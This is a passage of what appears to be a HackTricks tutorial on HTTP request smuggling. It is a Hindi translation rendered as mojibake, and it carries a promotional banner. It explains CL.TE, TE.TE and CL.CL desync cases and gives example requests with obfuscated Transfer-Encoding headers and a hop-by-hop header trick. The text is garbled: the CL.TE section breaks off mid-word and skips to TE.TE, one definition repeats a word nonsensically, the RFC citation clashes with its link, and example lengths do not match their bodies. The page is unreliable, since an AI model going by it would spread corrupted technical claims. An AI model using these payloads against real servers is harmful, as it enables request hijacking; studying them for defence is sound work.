# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдХреНрдпрд╛ рд╣реИ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдПрдХ **рдЕрд╡реИрддрдирд┐рдХрд░рдг** рдХреА рд╕реНрдерд┐рддрд┐ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА** рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдПрдХ HTTP **рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдкреНрд░реЙрдХреНрд╕реА (рд▓реЛрдб рдмреИрд▓реЗрдВрд╕/рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА) рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЗрд╕рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдиреЗ рдмрд╛рдж рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдиреЗ рдХреА рд╕реНрд╡рддрдВрддреНрд░рддрд╛ рдорд┐рд▓рддреА рд╣реИред

### рд╕рд┐рджреНрдзрд╛рдВрдд

[**RFC рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди (2161)**](https://tools.ietf.org/html/rfc2616)

> рдпрджрд┐ рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдПрдХ Transfer-Encoding рд╣реИрдбрд░ рдлрд╝реАрд▓реНрдб рдФрд░ рдПрдХ Content-Length рд╣реИрдбрд░ рдлрд╝реАрд▓реНрдб рд╣реИ, рддреЛ рдЕрдВрддрд┐рдо рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**Content-Length**

> Content-Length рдПрдВрдЯрд┐рдЯреА рд╣реИрдбрд░ рд╢рд░реАрд░ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП рдмрд╛рдЗрдЯ рдореЗрдВ рдПрдВрдЯрд┐рдЯреА-рдмреЙрдбреА рдХрд╛ рдЖрдХрд╛рд░ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

**Transfer-Encoding: chunked**

> Transfer-Encoding рд╣реИрдбрд░ рдкреЗрд╢реЗрд╡рд░ рдХреЛ рдкреЗрд╢реЗрд╡рд░ рдХреЛ рдкреЗрд╢реЗрд╡рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдкреЗрд╢реЗрд╡рд░ рдХреЛ рдкреЗрд╢реЗрд╡рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдбрд┐рдВрдЧ рдХрд╛ рд░реВрдк рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред\
> Chunked рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдЯреБрдХрдбрд╝реЛрдВ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ

### рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛

**рдлреНрд░рдВрдЯ-рдПрдВрдб** (рд▓реЛрдб-рдмреИрд▓реЗрдВрд╕ / рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА) _**content-length**_ рдпрд╛ _**transfer-encoding**_ рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░рд╛** рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ 2 рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ **рдЕрд╡реИрддрдирд┐рдХрд░рдг** рд╣реЛрддрд╛ рд╣реИред\
рдпрд╣ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреА рдЬреЛ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдЦрддрд░рд╛ рдЗрд╕ рддрдереНрдп рдореЗрдВ рдирд┐рд╣рд┐рдд рд╣реИ рдХрд┐ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░рд╛ рдЕрдиреБрд░реЛрдз рдЗрдВрдЬреЗрдХреНрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд░реЗрдЧрд╛ рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ **рдЕрдЧрд▓реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдЖрдпрд╛ рд╣реИ** рдФрд░ рдЙрд╕ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз** **рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдЕрдиреБрд░реЛрдз** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрдЧрд╛ред

### рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ HTTP рдореЗрдВ **рдирдпрд╛ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдг 2 рдмрд╛рдЗрдЯреЛрдВ рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ:**

* **Content-Length**: рдпрд╣ рд╣реЗрдбрд░ рдПрдХ **рджрд╢рдорд▓рд╡ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкреНрд░рд╛рдкреНрддрд┐-рд╢рд░реАрд░ рдХреЗ рдмрд╛рдЗрдЯреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рд╢рд░реАрд░ рдХреА рдЕрдВрддрд┐рдо рд╡рд░реНрдг рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реИ, **рдЕрдиреБрд░реЛрдз рдХреЗ рдЕрдВрдд рдореЗрдВ рдирдИ рдкрдВрдХреНрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред
* **Transfer-Encoding:** рдпрд╣ рд╣реЗрдбрд░ рд╢рд░реАрд░ рдореЗрдВ рдПрдХ **рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдЕрдЧрд▓реЗ рдЪрдВрдХ** рдХреА **рдмрд╛рдЗрдЯреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред **рдЪрдВрдХ** рдХреЛ рдПрдХ **рдирдИ рдкрдВрдХреНрддрд┐** рдХреЗ рд╕рд╛рде **рд╕рдорд╛рдкреНрдд** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЗрд╕ рдирдИ рдкрдВрдХреНрддрд┐ рдХреЛ **рд▓рдВрдмрд╛рдИ рд╕реВрдЪрдХ рд╕реЗ рдирд╣реАрдВ рдЧрд┐рдирд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рд╡рд┐рдзрд┐ рдХреЛ **0 рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЪрдВрдХ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ 2 рдирдИ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рдж рдЕрдиреБрд╕рд░рдг рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**: `0`
* **Connection**: рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреЗ рдкрд╣рд▓реЗ рдЕрдиреБрд░реЛрдз рдкрд░ **`Connection: keep-alive`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрдЪреНрдЫрд╛ рд╣реИред

## рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

{% hint style="success" %}
рдЗрд╕реЗ Burp Suite рдХреЗ рд╕рд╛рде рдЗрд╕рдХрд╛ рд╢рд┐рдХрд╛рд░ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╕рдордп **`Update Content-Length` рдФрд░ `Normalize HTTP/1 line endings` рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдЧреИрдЬреЗрдЯреНрд╕ рдирдИ рд▓рд╛рдЗрди, рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдФрд░ рдЧрд▓рдд рд╡рд┐рд╖рдп-рд▓рдВрдмрд╛рдИ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
{% endhint %}

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╣рдорд▓реЗ рдЕрд╕реНрдкрд╖реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдмреАрдЪ `Content-Length` (CL) рдФрд░ `Transfer-Encoding` (TE) рд╣реЗрдбрд░ рдХреЛ рдХреИрд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддреЗ рд╣реИрдВ рдореЗрдВ рдЕрдВрддрд░реЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рд╣рдорд▓реЗ рд╡рд┐рднрд┐рдиреНрди рд░реВрдкреЛрдВ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **CL.TE**, **TE.CL**, рдФрд░ **TE.TE** рдХреЗ рд░реВрдк рдореЗрдВред рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХрд╛рд░ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╕рдВрдпреЛрдЬрди рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЗрди рд╣реЗрдбрд░реНрд╕ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддреЗ рд╣реИрдВред рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдХреЛ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рд╕реЗ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд░рдиреЗ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

### рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ (рдлреНрд░рдВрдЯ-рдПрдВрдб рджреНрд╡рд╛рд░рд╛ Content-Length рдХрд╛ рдЙрдкрдпреЛрдЧ, рдмреИрдХ-рдПрдВрдб рджреНрд╡рд╛рд░рд╛ Transfer-Encoding рдХрд╛ рдЙрдкрдпреЛрдЧ)

* **рдлреНрд░рдВрдЯ-рдПрдВрдб (CL):** `Content-Length` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд░рддрд╛ рд╣реИред
* **рдмреИрдХ-рдПрдВрдб (TE):** `Transfer-Encoding` рд╣реЗрдбрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд░рддрд╛ рд╣реИред
* **рд╣рдорд▓рд╛ рд╕реНрдиреЗрд╣рдпреБрдХреНрдд:** 
* рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `Content-Length` рд╣реЗрдбрд░ рдХреА рдорд╛рдиреНрдпрддрд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд╛рдордЧреНрд░реА рд▓рдВрдмрд╛рдИ рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддреАред
* рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рдорд╛рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреВрд░реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмреИрдХ-
#### TE.TE рд╡рдВрд░рдмрд┐рд▓рд┐рдЯреА (рджреЛрдиреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ Transfer-Encoding, рдЫрд▓рд╛рд╡рд╛ рдХреЗ рд╕рд╛рде)

* **рд╕рд░реНрд╡рд░:** рджреЛрдиреЛрдВ `Transfer-Encoding` рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдПрдХ рдХреЛ рдЫрд▓рд╛рд╡рд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рдиреЗ рдореЗрдВ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рд╣рдорд▓реЗ рдХрд╛ рдкрд░рд┐рджреГрд╢реНрдп:**
* рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп `Transfer-Encoding` рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИред
* рдХрд┐рд╕ рд╕рд░реНрд╡рд░ (рдлреНрд░рдВрдЯ-рдПрдВрдб рдпрд╛ рдмреИрдХ-рдПрдВрдб) рдХреЛ рдЫрд▓рд╛рд╡рд╛ рдкрд╣рдЪрд╛рдирдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рдЙрд╕рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ CL.TE рдпрд╛ TE.CL рд╡рдВрд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢рд┐рдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдЕрдиреБрд░реЛрдз рдХрд╛ рдЕрдкреНрд░рд╕рдВрд╕реНрдХреГрдд рднрд╛рдЧ, рдЬреЛ рдХрд┐рд╕реА рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдЖрдЧрд╛рдореА рдЕрдиреБрд░реЛрдз рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрди рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ smuggling рд╣реЛрддреА рд╣реИред
*   **рдЙрджрд╛рд╣рд░рдг:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL рдкрд░рд┐рджреГрд╢реНрдп (рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ):**

* рджреЛрдиреЛрдВ рд╕рд░реНрд╡рд░ рдХреЗрд╡рд▓ `Content-Length` рд╣реЗрдбрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрд░реЛрдз рдХрд╛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд░рддреЗ рд╣реИрдВред
* рдпрд╣ рдкрд░рд┐рджреГрд╢реНрдп рд╕рд╛рдорд╛рдиреНрдпрдд: smuggling рдореЗрдВ рдирд╣реАрдВ рд▓реЗ рдЬрд╛рддрд╛, рдХреНрдпреЛрдВрдХрд┐ рджреЛрдиреЛрдВ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдЕрдиреБрд░реЛрдз рд▓рдВрдмрд╛рдИ рдХреЛ рдХреИрд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддреЗ рд╣реИрдВ рдореЗрдВ рд╕рдорд░реВрдкрддрд╛ рд╣реЛрддреА рд╣реИред
*   **рдЙрджрд╛рд╣рд░рдг:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз
```

#### **CL != 0 рдкрд░рд┐рджреГрд╢реНрдп:**

* рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ `Content-Length` рд╣реЗрдбрд░ рдореМрдЬреВрдж рд╣реИ рдФрд░ рд╢реВрдиреНрдп рдХреЗ рдмрд░рд╛рдмрд░ рдЕрдиреНрдп рдорд╛рди рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдз рдмреЙрдбреА рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд╣реИред
* рдпрд╣ smuggling рд╣рдорд▓реЛрдВ рдХреЛ рд╕рдордЭрдиреЗ рдФрд░ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрдиреБрд░реЛрдз рдХреЗ рдЕрдВрдд рдХреЛ рдХреИрд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред
*   **рдЙрджрд╛рд╣рд░рдг:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

рдЧреИрд░-рдЦрд╛рд▓реА рдмреЙрдбреА
```

#### рд╣реЙрдк-рдмрд╛рдИ-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрдмрд░рджрд╕реНрддреА

рд╣реЙрдк-рдмрд╛рдИ-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрдХреЗрддрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рд╣реЗрдбрд░ Content-Length рдпрд╛ Transfer-Encoding рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рддрд╛рдХрд┐ HTTP рдЕрдиреБрд░реЛрдз smuggling рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред
```
Connection: Content-Length
```
## HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдХреА рд╡рдВрд╢рд╛рдиреБрд░реЛрдз рджреЛрд╖ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдХреНрд╕рд░ рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдпрд╣ рджреЗрдЦрдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред рдпреЗ рддрдХрдиреАрдХреЗрдВ рд╕реА.рдПрд▓.рдЯреА. рдФрд░ рдЯреА.рдИ.рд╕реА.рдПрд▓. рджреЛрд╖реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИрдВред рдЗрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдРрд╕реА рджреЛрд╖реЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рд░рдгрдиреАрддрд┐рдпрд╛рдБ рдФрд░ рдЙрдкрдХрд░рдг рд╣реИрдВ рдЬреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рджреЛрд╖реЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ 